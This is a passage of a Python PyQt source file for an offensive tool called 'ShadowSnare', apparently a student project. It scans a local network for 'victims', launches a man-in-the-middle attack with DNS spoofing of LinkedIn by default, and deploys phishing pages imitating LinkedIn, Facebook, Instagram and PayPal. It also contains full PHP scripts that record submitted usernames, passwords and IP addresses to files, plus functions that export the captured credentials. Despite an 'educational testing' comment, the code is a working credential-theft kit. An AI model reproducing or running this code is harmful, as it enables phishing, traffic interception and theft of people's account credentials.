            updated_content = f"#!/bin/bash\n\necho \"🧪 Testing bettercap with interface: {interface_name}...\"\n" + updated_content
            
            with open('/home/saket/Documents/SummerSchool2025IITJammu/test_bettercap_script.sh', 'w') as f:
                f.write(updated_content)
                
            self.log_message(f"✅ Test script updated for interface: {interface_name}", "SUCCESS")
        except Exception as e:
            self.log_message(f"⚠️ Could not update test script: {str(e)}", "WARNING")
    
    def start_uptime_timer(self):
        """Start uptime timer"""
        self.start_time = datetime.now()
        self.uptime_timer = QTimer()
        self.uptime_timer.timeout.connect(self.update_uptime)
        self.uptime_timer.start(1000)  # Update every second
    
    def update_uptime(self):
        """Update uptime display"""
        if self.start_time:
            uptime = datetime.now() - self.start_time
            hours, remainder = divmod(int(uptime.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            self.uptime_label.setText(f"🕒 Uptime: {hours:02d}:{minutes:02d}:{seconds:02d}")
    
    def log_message(self, message, level="INFO"):
        """Add message to logs with enhanced formatting"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "ERROR":
            color = "#ff6b6b"
            icon = "❌"
            bg_color = "#2d1a1a"
        elif level == "SUCCESS":
            color = "#51cf66"
            icon = "✅"
            bg_color = "#1a2d1a"
        elif level == "WARNING":
            color = "#ffd43b"
            icon = "⚠️"
            bg_color = "#2d2d1a"
        else:
            color = "#74c0fc"
            icon = "ℹ️"
            bg_color = "#1a1a2d"
        
        if not self.show_only_errors.isChecked() or level == "ERROR":
            # Enhanced log formatting with better visibility
            log_entry = f'''
            <div style="background-color: {bg_color}; padding: 4px 8px; margin: 2px 0; border-radius: 4px; border-left: 3px solid {color};">
                <span style="color: #888; font-size: 11px;">[{timestamp}]</span>
                <span style="color: {color}; font-weight: bold;">{icon}</span>
                <span style="color: #ffffff; margin-left: 8px;">{message}</span>
            </div>
            '''
            self.logs_display.append(log_entry)
            
            if self.auto_scroll.isChecked():
                scrollbar = self.logs_display.verticalScrollBar()
                scrollbar.setValue(scrollbar.maximum())
    
    # Dashboard Tab Methods
    def start_attack(self):
        """Start full attack from dashboard"""
        interface = self.interface_combo.currentText()
        if not interface:
            QMessageBox.warning(self, "Error", "Please select a network interface first")
            return
            
        self.log_message("Starting full MITM attack...", "INFO")
        self.start_mitm()
    
    def stop_attack(self):
        """Stop attack from dashboard"""
        self.stop_mitm()
    
    def refresh_victims(self):
        """Refresh victims list"""
        self.scan_network()
    
    def view_logs(self):
        """Switch to logs tab"""
        # Find and switch to logs tab
        for i in range(self.centralWidget().layout().itemAt(0).widget().count()):
            if "📜 Logs" in self.centralWidget().layout().itemAt(0).widget().tabText(i):
                self.centralWidget().layout().itemAt(0).widget().setCurrentIndex(i)
                break
    
    def verify_dns_spoofing(self):
        """Trigger DNS verification through the MITM engine"""
        if self.mitm_engine and self.attack_active:
            self.log_message("🔍 Starting DNS spoofing verification...", "INFO")
            self.mitm_engine.verify_dns_spoofing()
        else:
            self.show_message("DNS Verification", "Please start the MITM attack first before verifying DNS spoofing.", "warning")
    
    def run_test_script(self):
        """Run the enhanced DNS spoofing test script"""
        try:
            # Check if test script exists
            script_path = "/home/saket/Documents/SummerSchool2025IITJammu/dns_spoofing_test.sh"
            if not os.path.exists(script_path):
                self.show_message("Test Script Error", f"Test script not found at: {script_path}", "error")
                return
            
            # Ask for confirmation
            confirm = QMessageBox(self)
            confirm.setIcon(QMessageBox.Question)
            confirm.setWindowTitle("Run DNS Test Script")
            confirm.setText("This will run the enhanced DNS spoofing test script.\n\n"
                           "The script will:\n"
                           "• Set up aggressive iptables rules\n"
                           "• Block DoH/DoT endpoints\n"
                           "• Run comprehensive DNS spoofing\n"
                           "• Show real-time monitoring\n\n"
                           "Continue?")
            confirm.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            confirm.setStyleSheet(self.get_dialog_style())
            
            if confirm.exec_() == QMessageBox.Yes:
                self.log_message("🧪 Launching enhanced DNS spoofing test script...", "INFO")
                
                # Open script in a new terminal for interactive use
                try:
                    subprocess.Popen(['gnome-terminal', '--', 'bash', script_path])
                    self.log_message("✅ Test script launched in new terminal", "SUCCESS")
                except:
                    try:
                        subprocess.Popen(['xterm', '-e', f'bash {script_path}'])
                        self.log_message("✅ Test script launched in xterm", "SUCCESS")
                    except:
                        try:
                            subprocess.Popen(['konsole', '-e', f'bash {script_path}'])
                            self.log_message("✅ Test script launched in konsole", "SUCCESS")
                        except:
                            self.show_message("Terminal Error", 
                                             f"Could not open terminal. Run manually:\nsudo bash {script_path}", 
                                             "error")
        except Exception as e:
            error_msg = f"Failed to run test script: {str(e)}"
            self.log_message(error_msg, "ERROR")
            self.show_message("Script Error", error_msg, "error")
    
    # MITM Engine Tab Methods
    def scan_network(self):
        """Scan network for hosts"""
        if self.network_scanner and self.network_scanner.isRunning():
            return
        
        start_ip = self.ip_range_start.text()
        end_ip = self.ip_range_end.text()
        
        # Create progress dialog
        self.scan_progress = QProgressDialog("Scanning network...", "Cancel", 0, 100, self)
        self.scan_progress.setWindowTitle("Network Scan")
        self.scan_progress.setStyleSheet(self.get_dialog_style())
        
        # Timer for progress simulation
        self.scan_timer = QTimer()
        self.scan_progress_value = 0
        self.scan_timer.timeout.connect(self.update_scan_progress)
        self.scan_timer.start(200)  # Update every 200ms
        
        # Convert to CIDR notation for nmap
        try:
            start_parts = start_ip.split('.')
            end_parts = end_ip.split('.')
            base_ip = '.'.join(start_parts[:3])
            ip_range = f"{base_ip}.0/24"
            
            self.network_scanner = NetworkScanner(ip_range)
            self.network_scanner.hosts_found.connect(self.on_scan_complete)
            self.network_scanner.progress_update.connect(lambda msg: self.log_message(msg, "INFO"))
            self.network_scanner.start()
            
            self.scan_progress.show()
            
        except Exception as e:
            self.log_message(f"Scan error: {str(e)}", "ERROR")
            if hasattr(self, 'scan_timer'):
                self.scan_timer.stop()
    
    def update_scan_progress(self):
        """Update scan progress bar"""
        self.scan_progress_value += 5
        if self.scan_progress_value <= 95:
            self.scan_progress.setValue(self.scan_progress_value)
    
    def on_scan_complete(self, hosts):
        """Handle scan completion"""
        if hasattr(self, 'scan_timer'):
            self.scan_timer.stop()
        if hasattr(self, 'scan_progress'):
            self.scan_progress.setValue(100)
            self.scan_progress.close()
        
        self.update_victims_table(hosts)
        
        # Show results dialog
        results_dialog = QMessageBox(self)
        results_dialog.setWindowTitle("Scan Complete")
        results_dialog.setStyleSheet("""
            QMessageBox {
                background-color: #1a1a1a;
                color: #ffffff;
            }
            QMessageBox QPushButton {
                background-color: #2d2d2d;
                color: #ffffff;
                border: 1px solid #00ff7f;
                border-radius: 6px;
                padding: 8px 16px;
                min-width: 80px;
            }
            QMessageBox QPushButton:hover {
                background-color: #00ff7f;
                color: #000000;
            }
        """)
        results_dialog.setIcon(QMessageBox.Information)
        results_dialog.setText(f"Network scan completed!\n\nFound {len(hosts)} devices\n\nResults are available in the Victims tab.")
        
        view_victims_btn = results_dialog.addButton("View Victims", QMessageBox.ActionRole)
        ok_btn = results_dialog.addButton(QMessageBox.Ok)
        
        results_dialog.exec_()
        
        if results_dialog.clickedButton() == view_victims_btn:
            # Switch to victims tab
            for i in range(self.centralWidget().layout().itemAt(0).widget().count()):
                if "🧑‍💻 Victims" in self.centralWidget().layout().itemAt(0).widget().tabText(i):
                    self.centralWidget().layout().itemAt(0).widget().setCurrentIndex(i)
                    break
    
    def start_mitm(self):
        """Start MITM engine"""
        interface = self.interface_combo.currentText()
        
        if not interface:
            msg = QMessageBox(self)
            msg.setIcon(QMessageBox.Warning)
            msg.setWindowTitle("Error")
            msg.setText("Please select a network interface")
            msg.setStyleSheet(self.get_dialog_style())
            msg.exec_()
            return
        
        if not self.discovered_hosts:
            reply = QMessageBox(self)
            reply.setIcon(QMessageBox.Question)
            reply.setWindowTitle("No Victims")
            reply.setText("No victims discovered. Do you want to scan first?")
            reply.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            reply.setStyleSheet(self.get_dialog_style())
            
            if reply.exec_() == QMessageBox.Yes:
                self.scan_network()
                return
            else:
                # Manual target input
                input_dialog = QInputDialog(self)
                input_dialog.setStyleSheet(self.get_dialog_style())
                input_dialog.setWindowTitle("Manual Target")
                input_dialog.setLabelText("Enter target IP address:")
                input_dialog.setInputMode(QInputDialog.TextInput)
                
                if input_dialog.exec_() == QDialog.Accepted:
                    target_ip = input_dialog.textValue()
                    if not target_ip:
                        return
                else:
                    return
        else:
            # Show target selection dialog
            targets = [f"{host['ip']} ({host.get('hostname', 'Unknown')})" 
                      for host in self.discovered_hosts]
            
            input_dialog = QInputDialog(self)
            input_dialog.setStyleSheet(self.get_dialog_style())
            input_dialog.setWindowTitle("Select Target")
            input_dialog.setLabelText("Choose target to attack:")
            input_dialog.setComboBoxItems(targets)
            input_dialog.setInputMode(QInputDialog.TextInput)
            
            if input_dialog.exec_() == QDialog.Accepted:
                target_choice = input_dialog.textValue()
                target_ip = target_choice.split(' ')[0]
            else:
                return
        
        # Get domains to spoof
        spoof_dialog = QInputDialog(self)
        spoof_dialog.setStyleSheet(self.get_dialog_style())
        spoof_dialog.setWindowTitle("DNS Spoofing")
        spoof_dialog.setLabelText("Enter domains to spoof (comma-separated):")
        spoof_dialog.setTextValue("linkedin.com,*.linkedin.com")
        spoof_dialog.setInputMode(QInputDialog.TextInput)
        
        if spoof_dialog.exec_() == QDialog.Accepted:
            spoof_domains = spoof_dialog.textValue()
            if not spoof_domains:
                spoof_domains = "linkedin.com,*.linkedin.com"
        else:
            spoof_domains = "linkedin.com,*.linkedin.com"
        
        # Validate target IP is reachable
        try:
            ping_result = subprocess.run(['ping', '-c', '1', '-W', '2', target_ip], 
                                       capture_output=True, text=True)
            if ping_result.returncode != 0:
                confirm_unreachable = QMessageBox(self)
                confirm_unreachable.setIcon(QMessageBox.Warning)
                confirm_unreachable.setWindowTitle("Target Unreachable")
                confirm_unreachable.setText(f"Target {target_ip} is not responding to ping.\n\n"
                                          "Continue anyway? (Target might still be vulnerable)")
                confirm_unreachable.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
                confirm_unreachable.setStyleSheet(self.get_dialog_style())
                
                if confirm_unreachable.exec_() != QMessageBox.Yes:
                    return
        except Exception as e:
            self.log_message(f"Warning: Could not test target connectivity: {str(e)}", "WARNING")

        # Confirm attack
        confirm = QMessageBox(self)
        confirm.setIcon(QMessageBox.Question)
        confirm.setWindowTitle("Confirm Attack")
        confirm.setText(f"Start MITM attack on {target_ip}?\n\n"
                       f"Interface: {interface}\n"
                       f"Spoofing: {spoof_domains}")
        confirm.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
        confirm.setStyleSheet(self.get_dialog_style())
        
        if confirm.exec_() != QMessageBox.Yes:
            return
        
        self.mitm_engine = MITMEngine(interface, target_ip, spoof_domains)
        self.mitm_engine.status_update.connect(lambda msg: self.log_message(msg, "INFO"))
        self.mitm_engine.status_update.connect(lambda msg: self.log_to_attack_display(msg))
        self.mitm_engine.website_visited.connect(self.add_website_visit)
        self.mitm_engine.start()
        
        self.attack_active = True
        self.start_attack_btn.setEnabled(False)
        self.stop_attack_btn.setEnabled(True)
        self.verify_dns_btn.setEnabled(True)  # Enable DNS verification when attack is running
        self.mitm_status_label.setText("Running")
        self.mitm_status_label.setStyleSheet("color: #51cf66; font-weight: bold;")
        self.mitm_engine_status.setText("✅ MITM Engine Active")
        self.mitm_engine_status.setStyleSheet("color: #51cf66; font-weight: bold;")
        
        self.log_message("MITM Engine started successfully", "SUCCESS")
    
    def get_dialog_style(self):
        """Get dark theme style for dialogs"""
        return """
        QDialog {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        QMessageBox {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        QMessageBox QLabel {
            color: #ffffff !important;
            font-size: 14px;
            background-color: transparent;
        }
        QMessageBox QPushButton {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #00ff7f;
            border-radius: 6px;
            padding: 8px 16px;
            min-width: 80px;
            font-weight: 600;
        }
        QMessageBox QPushButton:hover {
            background-color: #00ff7f;
            color: #000000;
        }
        QInputDialog {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        QInputDialog QLabel {
            color: #ffffff !important;
            font-size: 14px;
            background-color: transparent;
        }
        QInputDialog QLineEdit {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 6px;
            padding: 8px;
            font-size: 14px;
        }
        QInputDialog QLineEdit:focus {
            border-color: #00ff7f;
        }
        QInputDialog QComboBox {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 6px;
            padding: 8px;
            font-size: 14px;
        }
        QInputDialog QComboBox:focus {
            border-color: #00ff7f;
        }
        QInputDialog QPushButton {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #00ff7f;
            border-radius: 6px;
            padding: 8px 16px;
            font-weight: 600;
        }
        QInputDialog QPushButton:hover {
            background-color: #00ff7f;
            color: #000000;
        }
        QProgressDialog {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        QProgressDialog QLabel {
            color: #ffffff !important;
            font-size: 14px;
            background-color: transparent;
        }
        QProgressBar {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 6px;
            text-align: center;
        }
        QProgressBar::chunk {
            background-color: #00ff7f;
            border-radius: 6px;
        }
        QFileDialog {
            background-color: #1a1a1a;
            color: #ffffff;
        }
        QFileDialog QLabel {
            color: #ffffff !important;
            background-color: transparent;
        }
        QFileDialog QLineEdit {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #404040;
            border-radius: 6px;
            padding: 6px;
        }
        QFileDialog QPushButton {
            background-color: #2d2d2d;
            color: #ffffff;
            border: 1px solid #00ff7f;
            border-radius: 6px;
            padding: 6px 12px;
        }
        QFileDialog QPushButton:hover {
            background-color: #00ff7f;
            color: #000000;
        }
        * {
            color: #ffffff;
        }
        """
    
    def show_message(self, title, message, msg_type="info"):
        """Show custom styled message box with white text"""
        msg_box = QMessageBox(self)
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        
        # Set style
        msg_box.setStyleSheet(self.get_dialog_style())
        
        # Force white text on labels after dialog is created
        def force_white_text():
            for widget in msg_box.findChildren(QLabel):
                widget.setStyleSheet("color: #ffffff !important; background-color: transparent; font-size: 14px;")
        
        # Connect to apply styling after dialog is shown
        QTimer.singleShot(10, force_white_text)
        
        # Set appropriate icon
        if msg_type == "error":
            msg_box.setIcon(QMessageBox.Critical)
        elif msg_type == "warning":
            msg_box.setIcon(QMessageBox.Warning)
        elif msg_type == "success":
            msg_box.setIcon(QMessageBox.Information)
        else:
            msg_box.setIcon(QMessageBox.Information)
            
        return msg_box.exec_()
    
    def stop_mitm(self):
        """Stop MITM engine"""
        if self.mitm_engine:
            self.mitm_engine.stop_engine()
            self.mitm_engine.quit()
            self.mitm_engine.wait()
        
        self.attack_active = False
        self.start_attack_btn.setEnabled(True)
        self.stop_attack_btn.setEnabled(False)
        self.verify_dns_btn.setEnabled(False)  # Disable DNS verification when attack stops
        self.mitm_status_label.setText("Stopped")
        self.mitm_status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        self.mitm_engine_status.setText("❌ MITM Engine Inactive")
        self.mitm_engine_status.setStyleSheet("color: #ff6b6b; font-weight: bold;")
        
        self.log_message("MITM Engine stopped", "WARNING")
    
    def start_apache(self):
        """Start Apache web server"""
        try:
            result = subprocess.run(['sudo', 'systemctl', 'start', 'apache2'], 
                                 capture_output=True, text=True, check=True)
            self.log_message("✅ Apache web server started successfully", "SUCCESS")
            self.show_message("Apache Status", "Apache web server started successfully!", "success")
        except subprocess.CalledProcessError as e:
            error_msg = f"Failed to start Apache: {e.stderr if e.stderr else str(e)}"
            self.log_message(f"❌ {error_msg}", "ERROR")
            self.show_message("Apache Error", error_msg, "error")
    
    def stop_apache(self):
        """Stop Apache web server"""
        try:
            result = subprocess.run(['sudo', 'systemctl', 'stop', 'apache2'], 
                                 capture_output=True, text=True, check=True)
            self.log_message("⏹️ Apache web server stopped", "WARNING")
            self.show_message("Apache Status", "Apache web server stopped successfully!", "warning")
        except subprocess.CalledProcessError as e:
            error_msg = f"Failed to stop Apache: {e.stderr if e.stderr else str(e)}"
            self.log_message(f"❌ {error_msg}", "ERROR")
            self.show_message("Apache Error", error_msg, "error")
    
    def restart_apache(self):
        """Restart Apache web server"""
        try:
            result = subprocess.run(['sudo', 'systemctl', 'restart', 'apache2'], 
                                 capture_output=True, text=True, check=True)
            self.log_message("🔄 Apache web server restarted successfully", "SUCCESS")
            self.show_message("Apache Status", "Apache web server restarted successfully!", "success")
        except subprocess.CalledProcessError as e:
            error_msg = f"Failed to restart Apache: {e.stderr if e.stderr else str(e)}"
            self.log_message(f"❌ {error_msg}", "ERROR")
            self.show_message("Apache Error", error_msg, "error")
    
    def check_apache_status(self):
        """Check Apache web server status"""
        try:
            result = subprocess.run(['sudo', 'systemctl', 'status', 'apache2'], 
                                 capture_output=True, text=True)
            if result.returncode == 0:
                status_info = "Apache is running and active"
                # Extract key info from status
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Active:' in line:
                        status_info += f"\n{line.strip()}"
                    elif 'Main PID:' in line:
                        status_info += f"\n{line.strip()}"
                
                self.log_message("📊 Apache status checked - Running", "SUCCESS")
                self.show_message("Apache Status", status_info, "success")
            else:
                self.log_message("📊 Apache status checked - Not running", "WARNING")
                self.show_message("Apache Status", "Apache web server is not running", "warning")
        except Exception as e:
            error_msg = f"Failed to check Apache status: {str(e)}"
            self.log_message(f"❌ {error_msg}", "ERROR")
            self.show_message("Apache Error", error_msg, "error")
    
    def update_victims_table(self, hosts):
        """Update victims table with discovered hosts"""
        self.discovered_hosts = hosts
        self.victims_table.setRowCount(len(hosts))
        
        for i, host in enumerate(hosts):
            self.victims_table.setItem(i, 0, QTableWidgetItem(host.get('ip', 'Unknown')))
            self.victims_table.setItem(i, 1, QTableWidgetItem(host.get('mac', 'Unknown')))
            self.victims_table.setItem(i, 2, QTableWidgetItem(host.get('hostname', 'Unknown')))
            self.victims_table.setItem(i, 3, QTableWidgetItem("Active"))
        
        self.victims_connected_label.setText(str(len(hosts)))
        self.log_message(f"Found {len(hosts)} potential victims", "SUCCESS")
    
    def clear_website_history(self):
        """Clear website monitoring history"""
        self.website_table.setRowCount(0)
        self.log_message("🗑️ Website history cleared", "INFO")
    
    def filter_logs(self):
        """Filter attack logs based on selection"""
        filter_type = self.log_filter.currentText()
        # This will be implemented to filter the logs display
        self.log_message(f"🔍 Log filter changed to: {filter_type}", "INFO")
    
    def clear_attack_logs(self):
        """Clear attack logs display"""
        self.attack_logs.clear()
        self.log_message("🗑️ Attack logs cleared", "INFO")
    
    def add_website_visit(self, url, victim_ip):
        """Add website visit to monitoring table"""
        from datetime import datetime
        
        row = self.website_table.rowCount()
        self.website_table.insertRow(row)
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.website_table.setItem(row, 0, QTableWidgetItem(timestamp))
        self.website_table.setItem(row, 1, QTableWidgetItem(victim_ip))
        self.website_table.setItem(row, 2, QTableWidgetItem(url))
        
        # Auto-scroll to bottom
        self.website_table.scrollToBottom()
        
        # Keep only last 50 entries
        if self.website_table.rowCount() > 50:
            self.website_table.removeRow(0)
    
    def log_to_attack_display(self, message, level="INFO"):
        """Log message to attack logs display with color coding"""
        from datetime import datetime
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Color coding based on message type
        if "🔑" in message or "credential" in message.lower():
            color = "#ff6b6b"  # Red for credentials
        elif "🌐" in message or "website" in message.lower():
            color = "#4ecdc4"  # Teal for websites
        elif "📡" in message or "http" in message.lower():
            color = "#45b7d1"  # Blue for HTTP
        elif "❌" in message or "error" in message.lower():
            color = "#ff6b6b"  # Red for errors
        elif "✅" in message or "success" in message.lower():
            color = "#51cf66"  # Green for success
        else:
            color = "#00ff00"  # Default green
        
        formatted_msg = f"<span style='color: #666666'>[{timestamp}]</span> <span style='color: {color}'>{message}</span>"
        self.attack_logs.append(formatted_msg)
        
        # Auto-scroll to bottom
        cursor = self.attack_logs.textCursor()
        cursor.movePosition(cursor.End)
        self.attack_logs.setTextCursor(cursor)
    
    # Fake Pages Tab Methods
    def preview_page(self):
        """Preview selected phishing page"""
        page_type = self.page_selector.currentText()
        self.log_message(f"Previewing {page_type}", "INFO")
        
        # Open local server in browser
        webbrowser.open("http://localhost")
    
    def edit_html(self):
        """Edit HTML of phishing page"""
        self.log_message("Opening HTML editor", "INFO")
        QMessageBox.information(self, "HTML Editor", "HTML editor functionality will be implemented")
    
    def deploy_page(self):
        """Deploy selected phishing page"""
        page_type = self.page_selector.currentText()
        
        try:
            if "LinkedIn" in page_type:
                self.deploy_linkedin_page()
            elif "Facebook" in page_type:
                self.deploy_facebook_page()
            elif "Instagram" in page_type:
                self.deploy_instagram_page()
            elif "PayPal" in page_type:
                self.deploy_paypal_page()
            else:
                self.deploy_custom_page()
                
            self.log_message(f"Deployed {page_type} successfully", "SUCCESS")
            
        except Exception as e:
            self.log_message(f"Failed to deploy {page_type}: {str(e)}", "ERROR")
    
    def stop_hosting(self):
        """Stop hosting phishing page"""
        try:
            subprocess.run(['sudo', 'systemctl', 'stop', 'apache2'], check=True)
            self.log_message("Stopped hosting phishing page", "WARNING")
        except Exception as e:
            self.log_message(f"Failed to stop hosting: {str(e)}", "ERROR")
    
    
    # Clean methods - no hardcoded content
    def open_html_directory(self):
        """Open the HTML directory for user to manage files"""
        try:
            subprocess.run(['xdg-open', '/var/www/html/'], check=True)
            self.log_message("📁 Opened /var/www/html/ directory", "INFO")
        except Exception as e:
            self.log_message(f"❌ Could not open directory: {str(e)}", "ERROR")
    
    def deploy_capture_script(self):
        """Deploy only the credential capture script - no templates"""
        php_content = """<?php
// ShadowSnare Credential Capture Script
// Put YOUR OWN HTML files in this directory

if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $service = $_POST['service'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    $data = "[$timestamp] Service: $service | IP: $ip | Username: $username | Password: $password | User-Agent: $user_agent\\n";
    file_put_contents('/var/www/html/captured_credentials.txt', $data, FILE_APPEND | LOCK_EX);
    
    // Redirect back to referring page or index
    $redirect = $_POST['redirect'] ?? '/';
    header("Location: $redirect");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>ShadowSnare Framework</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .success { color: #00aa00; font-weight: bold; }
        .info { color: #0066cc; margin-bottom: 20px; }
        code { background: #f0f0f0; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 ShadowSnare Framework Active</h1>
        <p class="info">This is the default page. Put your own HTML files here!</p>
        <p><strong>To use:</strong></p>
        <ul>
            <li>Create your own HTML files in <code>/var/www/html/</code></li>
            <li>Name your main file <code>index.html</code> to replace this page</li>
            <li>Forms should POST to <code>credentials.php</code> with fields named <code>username</code> and <code>password</code></li>
            <li>Add hidden field: <code>&lt;input type="hidden" name="service" value="your-service"&gt;</code></li>
        </ul>
        <p class="success">✅ Credential capture system is active and ready!</p>
    </div>
</body>
</html>"""
        
        try:
            # Write the capture script
            with open('/var/www/html/credentials.php', 'w') as f:
                f.write(php_content)
            
            # Set proper permissions
            subprocess.run(['sudo', 'chown', '-R', 'www-data:www-data', '/var/www/html/'], check=True)
            subprocess.run(['sudo', 'chmod', '-R', '755', '/var/www/html/'], check=True)
            
            self.capture_status_label.setText("✅ Capture system deployed")
            self.capture_status_label.setStyleSheet("color: #51cf66; font-weight: bold;")
            self.log_message("✅ Clean capture system deployed to /var/www/html/", "SUCCESS")
            
        except Exception as e:
            self.log_message(f"❌ Failed to deploy capture system: {str(e)}", "ERROR")
    
    def preview_current_page(self):
        """Preview whatever is currently in /var/www/html/"""
        try:
            import webbrowser
            webbrowser.open("http://localhost/")
            self.log_message("👁️ Opening localhost in browser", "INFO")
        except Exception as e:
            self.log_message(f"❌ Could not open browser: {str(e)}", "ERROR")
            
            self.log_message("Custom page deployed", "SUCCESS")
    
    # Victims Tab Methods
    def block_victim(self):
        """Block selected victim"""
        current_row = self.victims_table.currentRow()
        if current_row >= 0:
            ip = self.victims_table.item(current_row, 0).text()
            self.log_message(f"Blocked victim: {ip}", "WARNING")
    
    def disconnect_victim(self):
        """Disconnect selected victim"""
        current_row = self.victims_table.currentRow()
        if current_row >= 0:
            ip = self.victims_table.item(current_row, 0).text()
            self.log_message(f"Disconnected victim: {ip}", "WARNING")
    
    def inspect_traffic(self):
        """Inspect victim's traffic"""
        current_row = self.victims_table.currentRow()
        if current_row >= 0:
            ip = self.victims_table.item(current_row, 0).text()
            self.log_message(f"Inspecting traffic for: {ip}", "INFO")
    
    # Credentials Tab Methods
    def export_txt(self):
        """Export credentials to txt file"""
        file_dialog = QFileDialog(self)
        file_dialog.setStyleSheet(self.get_dialog_style())
        file_dialog.setWindowTitle("Export Credentials")
        file_dialog.setNameFilter("Text files (*.txt)")
        file_dialog.setDefaultSuffix("txt")
        file_dialog.setAcceptMode(QFileDialog.AcceptSave)
        
        if file_dialog.exec_() == QDialog.Accepted:
            files = file_dialog.selectedFiles()
            if files:
                file_path = files[0]
                try:
                    with open(file_path, 'w') as f:
                        for cred in self.captured_credentials:
                            f.write(f"[{cred['timestamp']}] Service: {cred['service']} | Username: {cred['username']} | Password: {cred['password']}\n")
                    self.log_message(f"Credentials exported to {file_path}", "SUCCESS")
                except Exception as e:
                    self.log_message(f"Export failed: {str(e)}", "ERROR")
    
    def export_csv(self):
        """Export credentials to csv file"""
        file_dialog = QFileDialog(self)
        file_dialog.setStyleSheet(self.get_dialog_style())
        file_dialog.setWindowTitle("Export Credentials")
        file_dialog.setNameFilter("CSV files (*.csv)")
        file_dialog.setDefaultSuffix("csv")
        file_dialog.setAcceptMode(QFileDialog.AcceptSave)
        
        if file_dialog.exec_() == QDialog.Accepted:
            files = file_dialog.selectedFiles()
            if files:
                file_path = files[0]
                try:
                    import csv
                    with open(file_path, 'w', newline='') as f:
                        writer = csv.writer(f)
                        writer.writerow(['Timestamp', 'Service', 'Username', 'Password'])
                        for cred in self.captured_credentials:
                            writer.writerow([cred['timestamp'], cred['service'], cred['username'], cred['password']])
                    self.log_message(f"Credentials exported to {file_path}", "SUCCESS")
                except Exception as e:
                    self.log_message(f"Export failed: {str(e)}", "ERROR")
    
    def clear_credentials(self):
        """Clear all captured credentials"""
        self.credentials_table.setRowCount(0)
        self.captured_credentials.clear()
        self.captured_creds_label.setText("0")
        self.log_message("All credentials cleared", "WARNING")
    
    # Fake Pages Tab Methods - Ethical Implementation
    def open_html_directory(self):
        """Open the HTML directory for manual page creation"""
        try:
            subprocess.run(['sudo', 'mkdir', '-p', '/var/www/html'], check=True)
            subprocess.run(['sudo', 'chmod', '755', '/var/www/html'], check=True)
            subprocess.run(['xdg-open', '/var/www/html'], check=False)
            self.log_message("📂 Opened /var/www/html directory", "INFO")
            self.show_message("Directory Opened", "HTML directory opened for manual page creation.\nCreate your own test pages here.", "info")
        except Exception as e:
            error_msg = f"Failed to open HTML directory: {str(e)}"
            self.log_message(error_msg, "ERROR")
            self.show_message("Error", error_msg, "error")
    
    def deploy_capture_script(self):
        """Deploy the credentials capture PHP script"""
        try:
            # Create the credentials capture PHP script
            php_script = '''<?php
// Credentials Capture Script for Educational Testing
// ShadowSnare - Team PORT:443

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';
    $service = $_POST['service'] ?? 'web-form';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    // Log to text file
    $log_entry = "[{$timestamp}] IP: {$ip} | Service: {$service} | Username: {$username} | Password: {$password}\\n";
    file_put_contents('/var/www/html/credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);
    
    // Log to JSON file for programmatic access
    $json_entry = [
        'timestamp' => $timestamp,
        'ip' => $ip,
        'service' => $service,
        'username' => $username,
        'password' => $password
    ];
    
    $json_log = '/var/www/html/credentials.json';
    $existing_data = [];
    if (file_exists($json_log)) {
        $existing_data = json_decode(file_get_contents($json_log), true) ?? [];
    }
    $existing_data[] = $json_entry;
    file_put_contents($json_log, json_encode($existing_data, JSON_PRETTY_PRINT));
    
    // Respond with success
    echo json_encode(['status' => 'success', 'message' => 'Credentials captured']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}
?>'''
            
            # Write PHP script
            with open('/tmp/credentials.php', 'w') as f:
                f.write(php_script)
            
            # Deploy to Apache
            subprocess.run(['sudo', 'cp', '/tmp/credentials.php', '/var/www/html/'], check=True)
            subprocess.run(['sudo', 'chown', 'www-data:www-data', '/var/www/html/credentials.php'], check=True)
            subprocess.run(['sudo', 'chmod', '644', '/var/www/html/credentials.php'], check=True)
            
            # Create credentials files with proper permissions
            subprocess.run(['sudo', 'touch', '/var/www/html/credentials.txt'], check=True)
            subprocess.run(['sudo', 'touch', '/var/www/html/credentials.json'], check=True)
